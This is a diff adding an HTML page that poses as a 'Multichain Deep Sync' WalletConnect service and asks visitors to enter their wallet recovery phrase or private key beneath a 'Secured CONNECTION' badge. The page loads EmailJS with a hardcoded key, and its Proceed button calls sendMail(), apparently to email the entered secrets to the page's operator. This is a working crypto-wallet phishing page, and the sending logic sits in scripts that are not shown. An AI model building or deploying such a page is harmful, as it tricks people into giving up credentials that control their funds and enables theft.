@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="img/favicon (1).ico">
+    <meta name="description"
+        content="One wallet, multiverse support We are unifying Web3 by providing best-in-class, self-custodial, and multichain support" />
+    <title>Multichain Deep Sync - One Wallet, Multiverse support</title>
+    <link rel="stylesheet" href="connection.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+<script src="server.js"></script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("ncNSzaOcJGhF2_R6j");
+        })();
+    </script>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="content_one">
+
+            <div class="content_one_sub">
+
+                <div class="content_one_sub_container">
+
+                    <div class="content_one_sub_container_content">
+
+                        <div class="content_one_sub_container_content_img">
+                            <img src="img/wc1.png" alt="">
+                            <h3>Walletconnect</h3>
+                        </div>
+
+                        <div class="content_one_sub_container_content_text">
+                            <p><span>Info alert!</span> Securely use any of the options below</p>
+                        </div>
+
+                        <div class="input_container">
+
+                            <div class="input_container_head">
+                                <button onclick="showTextarea()" class="active">Phrase</button>
+                                <button onclick="showInput()">Private Key</button>
+                            </div>
+
+                           <div class="form_content">
+
+
+                                <div class="input_container_boby">
+                                    <textarea name="recovery_phrase" id="message" cols="30" rows="6"
+                                        placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)"
+                                        required></textarea>
+                                    <input type="text" id="code" placeholder="Enter your private key" name="private_key"
+                                        required>
+                                </div>
+
+                                <div class="input_container_link">
+                                    <button onclick="sendMail()"><a href="#" onclick="proceed()"
+                                            id="process">Proceed</a></button>
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                        <div class="content_one_sub_container_content_last">
+                            <img src="img/shield.png" alt="">
+                            <p>Secured <span>CONNECTION</span></p>
+                        </div>
+
+
+                    </div>
+
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    </div>
+
+
+</body>
+<script src="index.js"></script>
+</html>
